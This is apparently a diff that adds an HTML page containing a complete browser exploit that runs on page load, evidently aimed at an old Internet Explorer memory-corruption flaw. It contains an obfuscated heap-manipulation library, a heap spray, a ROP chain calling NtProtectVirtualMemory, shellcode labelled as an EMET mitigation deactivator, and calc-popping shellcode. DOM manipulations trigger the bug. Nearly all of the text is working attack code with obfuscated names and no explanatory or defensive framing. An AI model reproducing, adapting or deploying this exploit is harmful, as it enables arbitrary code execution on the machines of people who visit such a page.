@@ -1,0 +1,339 @@
+<html>
+<body>
+<script language='javascript'>
+/////////////////////// Obfuscated HeapLib Begin ///////////////////////
+function ToPPwqIDQVMuyLgInezaVInfhW() {
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW = function(maxAlloc, heapBase) {
+
+    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
+    this.heapBase = (heapBase ? heapBase : 0x150000);
+    this.bYpeqrJhnXCwNYeFbMpP = "AAAA";
+
+    while (4 + this.bYpeqrJhnXCwNYeFbMpP.length*2 + 2 < this.maxAlloc) {
+        this.bYpeqrJhnXCwNYeFbMpP += this.bYpeqrJhnXCwNYeFbMpP;
+    }
+    this.mem = new Array();
+    this.mvsNA();
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.EsIPPbzLUOowFPtObwBDIuUPkCGfZpS = function(msg) {
+    void(Math.atan2(0xbabe, msg));
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.nfWMHmAnYVtLCSHqvcYoIsVlwSKpeDcU = function(enable) {
+
+    if (enable == true)
+        void(Math.atan(0xbabe));
+    else
+        void(Math.asin(0xbabe));
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.KndoRGUhKLdB = function(msg) {
+    void(Math.acos(0xbabe));
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.SnsgPTOvzuTcDTCOUvH = function(len) {
+    if (len > this.bYpeqrJhnXCwNYeFbMpP.length)
+        throw "Requested SnsgPTOvzuTcDTCOUvH string length " + len + ", only " + this.bYpeqrJhnXCwNYeFbMpP.length + " available";
+
+    return this.bYpeqrJhnXCwNYeFbMpP.substr(0, len);
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.IqZXq = function(num, IqZXq) {
+    if (IqZXq == 0)
+        throw "Round argument cannot be 0";
+
+    return parseInt((num + (IqZXq-1)) / IqZXq) * IqZXq;
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.iLAf = function(num, width)
+{
+    var digits = "0123456789ABCDEF";
+
+    var iLAf = digits.substr(num & 0xF, 1);
+
+    while (num > 0xF) {
+        num = num >>> 4;
+        iLAf = digits.substr(num & 0xF, 1) + iLAf;
+    }
+
+    var width = (width ? width : 0);
+
+    while (iLAf.length < width)
+        iLAf = "0" + iLAf;
+
+    return iLAf;
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.PqoXHKErQhhYThnJ = function(PqoXHKErQhhYThnJ) {
+    return unescape("%u" + this.iLAf(PqoXHKErQhhYThnJ & 0xFFFF, 4) + "%u" + this.iLAf((PqoXHKErQhhYThnJ >> 16) & 0xFFFF, 4));
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.p = function(arg, tag) {
+
+    var size;
+    if (typeof arg == "string" || arg instanceof String)
+        size = 4 + arg.length*2 + 2;
+    else
+        size = arg;
+    if ((size & 0xf) != 0)
+        throw "Allocation size " + size + " must be a multiple of 16";
+    if (this.mem[tag] === undefined)
+        this.mem[tag] = new Array();
+
+    if (typeof arg == "string" || arg instanceof String) {
+        this.mem[tag].push(arg.substr(0, arg.length));
+    }
+    else {
+        this.mem[tag].push(this.SnsgPTOvzuTcDTCOUvH((arg-6)/2));
+    }
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.dtwkNqHexfwFtdvbWRZHvCLllxsArAZ = function(tag) {
+
+    delete this.mem[tag];
+    CollectGarbage();
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.mvsNA = function() {
+
+    this.EsIPPbzLUOowFPtObwBDIuUPkCGfZpS("Flushing the OLEAUT32 cache");
+
+    this.dtwkNqHexfwFtdvbWRZHvCLllxsArAZ("oleaut32");
+
+    for (var i = 0; i < 6; i++) {
+        this.p(32, "oleaut32");
+        this.p(64, "oleaut32");
+        this.p(256, "oleaut32");
+        this.p(32768, "oleaut32");
+    }
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.FBaafyBfOyKjKduknfFjKaF = function(arg, tag) {
+
+    var size;
+    if (typeof arg == "string" || arg instanceof String)
+        size = 4 + arg.length*2 + 2;
+    else
+        size = arg;
+    if (size == 32 || size == 64 || size == 256 || size == 32768)
+        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";
+    this.p(arg, tag);
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.yLuMNgpAiwmomYsnUIFAeGBNaTsGR = function(tag) {
+    this.dtwkNqHexfwFtdvbWRZHvCLllxsArAZ(tag);
+    this.mvsNA();
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.S = function() {
+
+    this.EsIPPbzLUOowFPtObwBDIuUPkCGfZpS("Running the garbage collector");
+    CollectGarbage();
+
+    this.mvsNA();
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.NWofqEgVBFeZEkPcaPh = function(arg, count) {
+
+    var count = (count ? count : 1);
+
+    for (var i = 0; i < count; i++) {
+        this.FBaafyBfOyKjKduknfFjKaF(arg);
+        this.FBaafyBfOyKjKduknfFjKaF(arg, "NWofqEgVBFeZEkPcaPh");
+    }
+    this.FBaafyBfOyKjKduknfFjKaF(arg);
+
+    this.yLuMNgpAiwmomYsnUIFAeGBNaTsGR("NWofqEgVBFeZEkPcaPh");
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.IlbKtGjYrUFSrOkPOIXCxt = function(arg, count) {
+
+    var size;
+    if (typeof arg == "string" || arg instanceof String)
+        size = 4 + arg.length*2 + 2;
+    else
+        size = arg;
+    if ((size & 0xf) != 0)
+        throw "Allocation size " + size + " must be a multiple of 16";
+
+    if (size+8 >= 1024)
+        throw("Maximum IlbKtGjYrUFSrOkPOIXCxt block size is 1008 bytes");
+
+    var count = (count ? count : 1);
+
+    for (var i = 0; i < count; i++)
+        this.FBaafyBfOyKjKduknfFjKaF(arg, "IlbKtGjYrUFSrOkPOIXCxt");
+
+    this.yLuMNgpAiwmomYsnUIFAeGBNaTsGR("IlbKtGjYrUFSrOkPOIXCxt");
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.YkysyJCKdwgXnGbWYh = function(arg)
+{
+    var size;
+    if (typeof arg == "string" || arg instanceof String)
+        size = 4 + arg.length*2 + 2;
+    else
+        size = arg;
+    if ((size & 0xf) != 0)
+        throw "Allocation size " + size + " must be a multiple of 16";
+
+    if (size+8 >= 1024)
+        throw("Maximum IlbKtGjYrUFSrOkPOIXCxt block size is 1008 bytes");
+
+    return this.heapBase + 0x688 + ((size+8)/8)*48;
+}
+
+ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW.prototype.YTULEzagVbNhkfVsK = function(shellcode, jmpecx, size) {
+
+    var size = (size ? size : 1008);
+    if ((size & 0xf) != 0)
+        throw "Vtable size " + size + " must be a multiple of 16";
+
+    if (shellcode.length*2 > size-138)
+        throw("Maximum shellcode length is " + (size-138) + " bytes");
+
+    var YTULEzagVbNhkfVsK = unescape("%u9090%u7ceb")
+
+    for (var i = 0; i < 124/4; i++)
+        YTULEzagVbNhkfVsK += this.PqoXHKErQhhYThnJ(jmpecx);
+
+    YTULEzagVbNhkfVsK += unescape("%u0028%u0028") +
+              shellcode + heap.SnsgPTOvzuTcDTCOUvH((size-138)/2 - shellcode.length);
+
+    return YTULEzagVbNhkfVsK;
+}
+/////////////////////// Obfuscated HeapLib End ///////////////////////
+
+	// lets start pwning :D
+	heap_obj = new ToPPwqIDQVMuyLgInezaVInfhW.XrJGskcjvVknhtW(0x20000);
+	var block = unescape("%u4242%u4242%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+		                     "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 // ProtectSize Value
+							 "%u0400%u0000" +
+							 // BaseAddress Value
+							 "%u0c0c%u0c0c" +
+							 // 0x63f05ba1 :  # POP EAX # RETN 
+							 "%u5ba1%u63f0" +
+							 // SyscallStub = 0x7ffe0300
+							 "%u0300%u7ffe" +
+							 // 0x63f0555c :  # MOV ECX,DWORD PTR DS:[EAX] # MOV EAX,DWORD PTR DS:[ECX] # XOR EDX,EDX # CMP EAX,C0000005 # SETE DL # MOV EAX,EDX # RETN  
+							 // ECX = KiFastSystemCall
+							 "%u555c%u63f0" +
+							 // 0x63f05ba1 :  # POP EAX # RETN 
+							 "%u5ba1%u63f0" +
+							 // NtProtectVirtualMemory Syscall Number = 0x000000D7
+							 "%u00D7%u0000" +
+							 // 0x63f0527b :  # PUSH ECX # RETN 
+							 "%u527b%u63f0" +
+							 // Ret2Pwn
+							 "%u0c80%u0c0c" +
+							 "%u4242%u4242" +
+							 // ProcessHandle
+							 "%uFFFF%uFFFF" +
+							 // BaseAddress Pointer
+							 "%u0c40%u0c0c" +
+							 // ProtectSize Pointer
+							 "%u0c08%u0c0c"  +
+							 // NewProtect
+							 "%u0040%u0000" +
+							 // OldProtect
+							 "%u0c0c%u0c0c" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141" +
+							 "%u4141%u4141%u4141%u4141%u4141%u4141" +
+							//63f0575b 94              xchg    eax,esp
+							//63f0575c 8b00            mov     eax,dword ptr [eax]
+							//63f0575e 890424          mov     dword ptr [esp],eax
+							//63f05761 c3              ret 
+							 "%u575b%u63f0" +
+							 "%u9090%u9090%u9090%u9090%u9090%u9090" +
+							// mov eax, fs:[0x8]
+							// mov esp,eax 
+							// add esp,400h
+							 "%uA164%u0008%u0000%uE08B%uc481%u0400%u0000" +
+							 // emet deactivator
+							 "%u9090%u3390%u64C9%u718B%u8B30%u0C76%u768B%u8B1C%u085E%u7E8B%u8B20%u6636%u4F39%u7518%u8BF2%u8BC3%u8BE8%u3C45%u548B%u7805%uD503%u4A8B%u8B18%u205A%uDD03%u35E3%u8B49%u8B34%uF503%uFF33%uC033%uACFC%uC084%u0774%uCFC1%u0307%uEBF8%u53F4%u1EBB%u64A4%u3BEF%u5BFB%uDC75%u5A8B%u0324%u66DD%u0C8B%u8B4B%u1C5A%uDD03%u048B%u038B%u8BC5%u8BD0%u015A%uD303%uC283%u8305%u09C2%u1A8B%uD303%uC283%u8B04%u89EC%u0455%u5589%uC708%u1045%u0040%u0000%u558D%u520C%u406A%u558D%u5210%u558D%u5208%uFF6A%u4168%u4141%uB841%u00D7%u0000%u00B9%uFE03%u8B7F%uFF09%u8BD1%u0455%u02C7%u04C2%u9000%u9090" +
+							 // Shellcode ( calc )
+							 "%uc7d9%u7eb8%ucf5d%ud9a7%u2474%u2bf4%u5ac9%u33b1%u4231%u0317%u1742%ubc83%u2d59%ubc52%u388a%u3c9d%u5b4b%ud917%u497a%uaa43%u5d2f%ufe07%u16c3%uea45%u5a50%u1d42%ud1d0%u10b4%ud7e1%ufe78%u7921%ufc05%u5975%ucf34%u988b%u2d71%uc863%u3a2a%ufdd6%u7e5f%ufceb%uf58f%u8753%uc9aa%u3d20%u19b4%u4a98%u81fe%u1592%ub0df%u4677%ufb23%ubdfc%ufad7%u8fd4%ucd18%u4318%ue227%u9d94%uc46f%ue846%u379b%uebfa%u4a5f%u7920%uec42%ud9a3%u0da6%ubf67%u012d%ucbcc%u056a%u18d3%u3101%u9f58%ub0c6%u841a%u99c2%ua5f9%u4753%udaaf%u2f84%u7f10%uddce%uf945%u8b8d%u8b98%uf2ab%u939b%u54b3%ua2f4%u3b38%u3a83%u78eb%u717b%u28b6%udc14%u6922%udf79%uad98%u5c84%u4d29%u7c73%u4858%u3a3f%u20b0%uaf50%u97b6%ufa51%u76d4%u66c2%u1d35%u0c62%u4149"
+					   );
+								 
+	while( block.length < 0x400 )
+		block += unescape("%u0000");
+	
+	while(block.length < 0x80000)
+		block += block;
+		
+	finalspray = block.substring(2, 0x80000 - 0x21);
+	
+	for(var i = 0; i < 350; i++)
+	{
+    heap_obj.FBaafyBfOyKjKduknfFjKaF(finalspray);
+	}
+
+	var obj_overwrite = unescape("%u0c0c%u0c0c");
+	while(obj_overwrite.length < 224) { obj_overwrite += obj_overwrite; }
+	obj_overwrite = obj_overwrite.slice(0, (224-6)/2);
+
+	for(var num_objs_counter = 0; num_objs_counter < 5; num_objs_counter++) 
+	{
+		document.body.innerHTML += "<object align='right' hspace='1000' width='1000'>TAG_1</object>";
+	}
+
+	for(var j = 0; j < 12288; j++) { 
+		heap_obj.FBaafyBfOyKjKduknfFjKaF(obj_overwrite, "freedObj1"); 
+	}
+	
+	for(var k = 0; k < 12288; k++) { 
+		heap_obj.FBaafyBfOyKjKduknfFjKaF(obj_overwrite, "freedObj2"); 
+	}
+
+	document.body.innerHTML += "<a id='tag_3' style='bottom:200cm;float:left;SnsgPTOvzuTcDTCOUvH-left:-1000px;border-width:2000px;text-indent:-1000px' >TAG_3</a>";
+	document.body.innerHTML += "AAAA";
+	document.body.innerHTML += "<strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='ltr'>TAG_11</strong>";
+
+</script>
+</body>
+</html>
